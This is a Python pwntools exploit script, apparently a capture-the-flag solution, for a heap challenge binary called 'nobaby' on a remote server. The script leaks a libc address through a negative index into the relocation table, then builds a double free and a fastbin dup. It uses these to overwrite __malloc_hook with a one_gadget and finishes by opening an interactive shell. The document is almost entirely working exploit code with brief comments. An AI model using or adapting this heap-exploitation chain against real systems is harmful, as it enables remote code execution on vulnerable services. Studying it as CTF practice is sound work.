from pwn import * 
# sh = process("./nobaby") 
sh = remote("bksec.team", 4328)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") 

def get_PIE(proc):
    memory_map = open("/proc/{}/maps".format(proc.pid),"rb").readlines()
    return int(memory_map[0].split("-")[0],16)

def debug(bp):
    #bp = [0xea0,0xd31,0xc52]
    #bp = [0x00000dfb,0x00000b7c,0x00000d10]
    script = ""
    PIE = get_PIE(sh)
    PAPA = PIE
    for x in bp:
        script += "b *0x%x\n"%(PIE+x)
    gdb.attach(sh,gdbscript=script) 

def add(content) : 
    sh.recv() 
    sh.sendline("1") 
    sh.recv() 
    sh.send(content) 

def free(id) : 
    sh.recv() 
    sh.sendline("3") 
    sh.recv()
    sh.sendline(str(id)) 

def show(id) : 
    sh.recv() 
    sh.sendline("2") 
    sh.recv() 
    sh.sendline(str(id)) 


# ********************** EXPLOIT ************************ 
# STAGE 1 : Leak libc 
sh.recv()
sh.sendline("hacmao") 
show(-262997)                   # (0x602060 - 0x4005b8) / 8  : ELF RELA Relocation Table  
print sh.recvuntil("Content: ")
free_addr = u64(sh.recv(6) + "\0\0") 
libc.address = free_addr - libc.sym['free'] 
malloc_hook = libc.sym['__malloc_hook'] 
one_gadget = libc.address + 0xf1147 
log.success("Libc = " + hex(libc.address)) 
log.success("Malloc_hook = " + hex(malloc_hook))

# STAGE 2 : DOUBLE FREE VULNERABLE 
sh.recv()
sh.sendline("hacmao") 

for i in range(10) : 
    add("\x00" * 0x50 + p64(0) + p64(0x70))                # count_node = 10 

# reset count_node = 0 
# count_node = 0x6020B0
# Node = 0x602060 
for i in range(11) : 
    free(0)             # count_node = 0 

add("A")                    # 0  
add("A")                    # overwrite count_node = malloc(0x60) -> A  

for i in range(0x71) : 
    print i 
    free(0)         # count_node = &node[9]    
# now we have 2 pointers point to 1 address 
free(10)        # free chunk 9 
free(8) 
free(9)         # now [fastbins] : 9 -> 8 -> 9  

# STAGE 3 : Fastbin dup into heap 
# 
# debug([0xB04, 0xBD0])
add(p64(malloc_hook - 0x23))    # 0    
add("A")                        # 8 
add("\x00")                        # 9 
  
add("A"*0x13 + p64(one_gadget))        # 10   
free(4)   

sh.recv() 
sh.sendline("1")


sh.interactive()
